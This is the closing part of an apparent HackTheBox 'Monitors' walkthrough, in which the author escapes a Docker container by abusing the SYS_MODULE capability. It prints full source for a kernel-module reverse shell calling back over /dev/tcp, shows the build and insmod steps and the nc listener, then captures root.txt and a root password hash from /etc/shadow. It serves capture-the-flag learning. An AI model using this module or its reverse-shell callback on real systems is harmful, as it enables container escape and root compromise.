+<p>root@8b08538ad9e7:/tmp# cat reverse-shell.c #include &lt;linux/kmod.h&gt; #include &lt;linux/module.h&gt; MODULE_LICENSE(“GPL”); MODULE_AUTHOR(“AttackDefense”); MODULE_DESCRIPTION(“LKM reverse shell module”); MODULE_VERSION(“1.0”); char* argv[] = {“/bin/bash”,“-c”,“bash -i &gt;&amp; /dev/tcp/172.17.0.1/4488 0&gt;&amp;1”, NULL}; static char* envp[] = {“PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin”, NULL }; static int __init reverse_shell_init(void) { return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); } static void __exit reverse_shell_exit(void) { printk(KERN_INFO “Exiting”); } module_init(reverse_shell_init); module_exit(reverse_shell_exit);</p>
+<p>Create the Makefile; root@8b08538ad9e7:/tmp# cat Makefile obj-m +=reverse-shell.o all: make -C /lib/modules/<span class="math inline">\((shell uname -r)/build M=\)</span>(PWD) modules clean: make -C /lib/modules/<span class="math inline">\((shell uname -r)/build M=\)</span>(PWD) clean</p>
+<p>Next we make the kernel module; root@8b08538ad9e7:/tmp/rev# make make -C /lib/modules/4.15.0-142-generic/build M=/tmp/rev modules make[1]: Entering directory ‘/usr/src/linux-headers-4.15.0-142-generic’ CC [M] /tmp/rev/reverse-shell.o gcc: error trying to exec ‘cc1’: execvp: No such file or directory make[2]: *** [scripts/Makefile.build:339: /tmp/rev/reverse-shell.o] Error 1 make[1]: *** [Makefile:1584: <em>module</em>/tmp/rev] Error 2 make[1]: Leaving directory ‘/usr/src/linux-headers-4.15.0-142-generic’ make: *** [Makefile:3: all] Error 2</p>
+<p>gcc cc1 was not found, and unfortunatley we are unable to fix this using ‘apt-get install –reinstall build-essential’. We can’t compile on any other host, as other headers would be used - /usr/src/linux-headers-5.10.0-kali4-amd64 on Kali for example, while the docker wants /usr/src/linux-headers-4.15.0-142-generic.</p>
+<p>Maybe it’s a formatting error, lets try to create the files on our local Kali host, and then transfer them to the remote container.</p>
+<p>[root:/git/htb/monitors/rev]# python3 -m http.server 80 root@8b08538ad9e7:/rev# wget http://10.10.14.12/Makefile root@8b08538ad9e7:/rev# wget http://10.10.14.12/reverse-shell.c</p>
+<p>root@8b08538ad9e7:/rev# make make -C /lib/modules/4.15.0-142-generic/build M=/rev modules make[1]: Entering directory ‘/usr/src/linux-headers-4.15.0-142-generic’ CC [M] /rev/reverse-shell.o gcc: error trying to exec ‘cc1’: execvp: No such file or directory make[2]: *** [scripts/Makefile.build:339: /rev/reverse-shell.o] Error 1 make[1]: *** [Makefile:1584: <em>module</em>/rev] Error 2 make[1]: Leaving directory ‘/usr/src/linux-headers-4.15.0-142-generic’ make: *** [Makefile:3: all] Error 2</p>
+<p>Still the same error.. reading about this issue it seems to be an error related to $PATH.</p>
+<p>root@8b08538ad9e7:/rev# $PATH bash: /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:</p>
+<p>GCC is also located in /usr/lib, which is not a part of <span class="math inline">\(PATH - lets add it and try to make again.
+  root@8b08538ad9e7:/rev# export PATH=\)</span>PATH:/usr/lib root@8b08538ad9e7:/rev# make make -C /lib/modules/4.15.0-142-generic/build M=/rev modules make[1]: Entering directory ‘/usr/src/linux-headers-4.15.0-142-generic’ CC [M] /rev/reverse-shell.o Building modules, stage 2. MODPOST 1 modules CC /rev/reverse-shell.mod.o LD [M] /rev/reverse-shell.ko make[1]: Leaving directory ‘/usr/src/linux-headers-4.15.0-142-generic’</p>
+<ol start="4" type="1">
+<li>We successfully compiled our reverse-shell! Setup a listener on the victim machine and trigger the reverse to grab root.txt.</li>
+</ol>
+<p>root@8b08538ad9e7:/rev# insmod reverse-shell.ko</p>
+<p>marcus@monitors:/tmp$ nc -lvnp 4488 Listening on [0.0.0.0] (family 0, port 4488) Connection from 10.10.10.238 60668 received! bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@monitors:/# id uid=0(root) gid=0(root) groups=0(root) root@monitors:/# cat /root/root.txt 07f715aa4df670c67174826151f2c30c</p>
+<pre><code>root@monitors:/root/.ssh# cat /etc/shadow
+  root:$6$vSJnzptH$pCoAuyngEc2pUm3Hos6qTNzopXdvnXACaAZEDAQU4VoBc19qxa9eASxv/EKnkTEOWWGyuPobtS/QA2kAFkrWP0:18577:0:99999:7:::</code></pre>
+<p>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████</p>
+<p>██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝</p>
+<p>WP Spritz RFI: https://github.com/mekhalleh/rfi-wp_sprit</p>
+<p>WordPress Salts and Security Keys: https://www.wpexplorer.com/wordpress-salts-security-keys/</p>
+<p>HackTrick.xyz LFI List: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list</p>
+<p>Cacti SQLi / RCE: https://www.exploit-db.com/exploits/49810</p>
+<p>Ofbiz RCE: https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data</p>
+<p>Docker Container Breakout, Abusing SYS_MODULE: https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd</p>
+<p>GCC cc1 Error: https://stackoverflow.com/questions/30344106/gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory-when-running-w</p>
+
+
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+window.document.addEventListener("DOMContentLoaded", function (event) {
+  const toggleBodyColorMode = (bsSheetEl) => {
+    const mode = bsSheetEl.getAttribute("data-mode");
+    const bodyEl = window.document.querySelector("body");
+    if (mode === "dark") {
+      bodyEl.classList.add("quarto-dark");
+      bodyEl.classList.remove("quarto-light");
+    } else {
+      bodyEl.classList.add("quarto-light");
+      bodyEl.classList.remove("quarto-dark");
+    }
+  }
+  const toggleBodyColorPrimary = () => {
+    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
+    if (bsSheetEl) {
+      toggleBodyColorMode(bsSheetEl);
+    }
+  }
+  toggleBodyColorPrimary();  
+  const icon = "";
+  const anchorJS = new window.AnchorJS();
+  anchorJS.options = {
+    placement: 'right',
+    icon: icon
+  };
+  anchorJS.add('.anchored');
+  const isCodeAnnotation = (el) => {
+    for (const clz of el.classList) {
+      if (clz.startsWith('code-annotation-')) {                     
+        return true;
+      }
+    }
+    return false;
+  }
+  const onCopySuccess = function(e) {
+    // button target
+    const button = e.trigger;
+    // don't keep focus
+    button.blur();
+    // flash "checked"
+    button.classList.add('code-copy-button-checked');
+    var currentTitle = button.getAttribute("title");
+    button.setAttribute("title", "Copied!");
+    let tooltip;
+    if (window.bootstrap) {
+      button.setAttribute("data-bs-toggle", "tooltip");
+      button.setAttribute("data-bs-placement", "left");
+      button.setAttribute("data-bs-title", "Copied!");
+      tooltip = new bootstrap.Tooltip(button, 
+        { trigger: "manual", 
+          customClass: "code-copy-button-tooltip",
+          offset: [0, -8]});
+      tooltip.show();    
+    }
+    setTimeout(function() {
+      if (tooltip) {
+        tooltip.hide();
+        button.removeAttribute("data-bs-title");
+        button.removeAttribute("data-bs-toggle");
+        button.removeAttribute("data-bs-placement");
+      }
+      button.setAttribute("title", currentTitle);
+      button.classList.remove('code-copy-button-checked');
+    }, 1000);
+    // clear code selection
+    e.clearSelection();
+  }
+  const getTextToCopy = function(trigger) {
+      const codeEl = trigger.previousElementSibling.cloneNode(true);
+      for (const childEl of codeEl.children) {
+        if (isCodeAnnotation(childEl)) {
+          childEl.remove();
+        }
+      }
+      return codeEl.innerText;
+  }
+  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+    text: getTextToCopy
+  });
+  clipboard.on('success', onCopySuccess);
+  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+    // For code content inside modals, clipBoardJS needs to be initialized with a container option
+    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
+    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+      text: getTextToCopy,
+      container: window.document.getElementById('quarto-embedded-source-code-modal')
+    });
+    clipboardModal.on('success', onCopySuccess);
+  }
+    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+    var mailtoRegex = new RegExp(/^mailto:/);
+      var filterRegex = new RegExp("https:\/\/exploit\.se");
+    var isInternal = (href) => {
+        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+    }
+    // Inspect non-navigation links and adorn them if external
+ 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+    for (var i=0; i<links.length; i++) {
+      const link = links[i];
+      if (!isInternal(link.href)) {
+        // undo the damage that might have been done by quarto-nav.js in the case of
+        // links that we want to consider external
+        if (link.dataset.originalHref !== undefined) {
+          link.href = link.dataset.originalHref;
+        }
+      }
+    }
+  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+    const config = {
+      allowHTML: true,
+      maxWidth: 500,
+      delay: 100,
+      arrow: false,
+      appendTo: function(el) {
+          return el.parentElement;
+      },
+      interactive: true,
+      interactiveBorder: 10,
+      theme: 'quarto',
+      placement: 'bottom-start',
+    };
+    if (contentFn) {
+      config.content = contentFn;
+    }
+    if (onTriggerFn) {
+      config.onTrigger = onTriggerFn;
+    }
+    if (onUntriggerFn) {
+      config.onUntrigger = onUntriggerFn;
+    }
+    window.tippy(el, config); 
+  }
+  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+  for (var i=0; i<noterefs.length; i++) {
+    const ref = noterefs[i];
+    tippyHover(ref, function() {
+      // use id or data attribute instead here
+      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+      try { href = new URL(href).hash; } catch {}
+      const id = href.replace(/^#\/?/, "");
+      const note = window.document.getElementById(id);
+      if (note) {
+        return note.innerHTML;
+      } else {
+        return "";
+      }
+    });
+  }
+  const xrefs = window.document.querySelectorAll('a.quarto-xref');
+  const processXRef = (id, note) => {
+    // Strip column container classes
+    const stripColumnClz = (el) => {
+      el.classList.remove("page-full", "page-columns");
+      if (el.children) {
+        for (const child of el.children) {
+          stripColumnClz(child);
+        }
+      }
+    }
+    stripColumnClz(note)
+    if (id === null || id.startsWith('sec-')) {
+      // Special case sections, only their first couple elements
+      const container = document.createElement("div");
+      if (note.children && note.children.length > 2) {
+        container.appendChild(note.children[0].cloneNode(true));
+        for (let i = 1; i < note.children.length; i++) {
+          const child = note.children[i];
+          if (child.tagName === "P" && child.innerText === "") {
+            continue;
+          } else {
+            container.appendChild(child.cloneNode(true));
+            break;
+          }
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(container);
+        }
+        return container.innerHTML
+      } else {
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        return note.innerHTML;
+      }
+    } else {
+      // Remove any anchor links if they are present
+      const anchorLink = note.querySelector('a.anchorjs-link');
+      if (anchorLink) {
+        anchorLink.remove();
+      }
+      if (window.Quarto?.typesetMath) {
+        window.Quarto.typesetMath(note);
+      }
+      // TODO in 1.5, we should make sure this works without a callout special case
+      if (note.classList.contains("callout")) {
+        return note.outerHTML;
+      } else {
+        return note.innerHTML;
+      }
+    }
+  }
+  for (var i=0; i<xrefs.length; i++) {
+    const xref = xrefs[i];
+    tippyHover(xref, undefined, function(instance) {
+      instance.disable();
+      let url = xref.getAttribute('href');
+      let hash = undefined; 
+      if (url.startsWith('#')) {
+        hash = url;
+      } else {
+        try { hash = new URL(url).hash; } catch {}
+      }
+      if (hash) {
+        const id = hash.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note !== null) {
+          try {
+            const html = processXRef(id, note.cloneNode(true));
+            instance.setContent(html);
+          } finally {
+            instance.enable();
+            instance.show();
+          }
+        } else {
+          // See if we can fetch this
+          fetch(url.split('#')[0])
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.getElementById(id);
+            if (note !== null) {
+              const html = processXRef(id, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      } else {
+        // See if we can fetch a full url (with no hash to target)
+        // This is a special case and we should probably do some content thinning / targeting
+        fetch(url)
+        .then(res => res.text())
+        .then(html => {
+          const parser = new DOMParser();
+          const htmlDoc = parser.parseFromString(html, "text/html");
+          const note = htmlDoc.querySelector('main.content');
+          if (note !== null) {
+            // This should only happen for chapter cross references
+            // (since there is no id in the URL)
+            // remove the first header
+            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+              note.children[0].remove();
+            }
+            const html = processXRef(null, note);
+            instance.setContent(html);
+          } 
+        }).finally(() => {
+          instance.enable();
+          instance.show();
+        });
+      }
+    }, function(instance) {
+    });
+  }
+      let selectedAnnoteEl;
+      const selectorForAnnotation = ( cell, annotation) => {
+        let cellAttr = 'data-code-cell="' + cell + '"';
+        let lineAttr = 'data-code-annotation="' +  annotation + '"';
+        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+        return selector;
+      }
+      const selectCodeLines = (annoteEl) => {
+        const doc = window.document;
+        const targetCell = annoteEl.getAttribute("data-target-cell");
+        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+        const lineIds = lines.map((line) => {
+          return targetCell + "-" + line;
+        })
+        let top = null;
+        let height = null;
+        let parent = null;
+        if (lineIds.length > 0) {
+            //compute the position of the single el (top and bottom and make a div)
+            const el = window.document.getElementById(lineIds[0]);
+            top = el.offsetTop;
+            height = el.offsetHeight;
+            parent = el.parentElement.parentElement;
+          if (lineIds.length > 1) {
+            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+            height = bottom - top;
+          }
+          if (top !== null && height !== null && parent !== null) {
+            // cook up a div (if necessary) and position it 
+            let div = window.document.getElementById("code-annotation-line-highlight");
+            if (div === null) {
+              div = window.document.createElement("div");
+              div.setAttribute("id", "code-annotation-line-highlight");
+              div.style.position = 'absolute';
+              parent.appendChild(div);
+            }
+            div.style.top = top - 2 + "px";
+            div.style.height = height + 4 + "px";
+            div.style.left = 0;
+            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+            if (gutterDiv === null) {
+              gutterDiv = window.document.createElement("div");
+              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+              gutterDiv.style.position = 'absolute';
+              const codeCell = window.document.getElementById(targetCell);
+              const gutter = codeCell.querySelector('.code-annotation-gutter');
+              gutter.appendChild(gutterDiv);
+            }
+            gutterDiv.style.top = top - 2 + "px";
+            gutterDiv.style.height = height + 4 + "px";
+          }
+          selectedAnnoteEl = annoteEl;
+        }
+      };
+      const unselectCodeLines = () => {
+        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+        elementsIds.forEach((elId) => {
+          const div = window.document.getElementById(elId);
+          if (div) {
+            div.remove();
+          }
+        });
+        selectedAnnoteEl = undefined;
+      };
+        // Handle positioning of the toggle
+    window.addEventListener(
+      "resize",
+      throttle(() => {
+        elRect = undefined;
+        if (selectedAnnoteEl) {
+          selectCodeLines(selectedAnnoteEl);
+        }
+      }, 10)
+    );
+    function throttle(fn, ms) {
+    let throttle = false;
+    let timer;
+      return (...args) => {
+        if(!throttle) { // first call gets through
+            fn.apply(this, args);
+            throttle = true;
+        } else { // all the others get throttled
+            if(timer) clearTimeout(timer); // cancel #2
+            timer = setTimeout(() => {
+              fn.apply(this, args);
+              timer = throttle = false;
+            }, ms);
+        }
+      };
+    }
+      // Attach click handler to the DT
+      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+      for (const annoteDlNode of annoteDls) {
+        annoteDlNode.addEventListener('click', (event) => {
+          const clickedEl = event.target;
+          if (clickedEl !== selectedAnnoteEl) {
+            unselectCodeLines();
+            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+            if (activeEl) {
+              activeEl.classList.remove('code-annotation-active');
+            }
+            selectCodeLines(clickedEl);
+            clickedEl.classList.add('code-annotation-active');
+          } else {
+            // Unselect the line
+            unselectCodeLines();
+            clickedEl.classList.remove('code-annotation-active');
+          }
+        });
+      }
+  const findCites = (el) => {
+    const parentEl = el.parentElement;
+    if (parentEl) {
+      const cites = parentEl.dataset.cites;
+      if (cites) {
+        return {
+          el,
+          cites: cites.split(' ')
+        };
+      } else {
+        return findCites(el.parentElement)
+      }
+    } else {
+      return undefined;
+    }
+  };
+  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+  for (var i=0; i<bibliorefs.length; i++) {
+    const ref = bibliorefs[i];
+    const citeInfo = findCites(ref);
+    if (citeInfo) {
+      tippyHover(citeInfo.el, function() {
+        var popup = window.document.createElement('div');
+        citeInfo.cites.forEach(function(cite) {
+          var citeDiv = window.document.createElement('div');
+          citeDiv.classList.add('hanging-indent');
+          citeDiv.classList.add('csl-entry');
+          var biblioDiv = window.document.getElementById('ref-' + cite);
+          if (biblioDiv) {
+            citeDiv.innerHTML = biblioDiv.innerHTML;
+          }
+          popup.appendChild(citeDiv);
+        });
+        return popup.innerHTML;
+      });
+    }
+  }
+});
+</script>
+</div> <!-- /content -->
+
+
+
+
+</body></html>
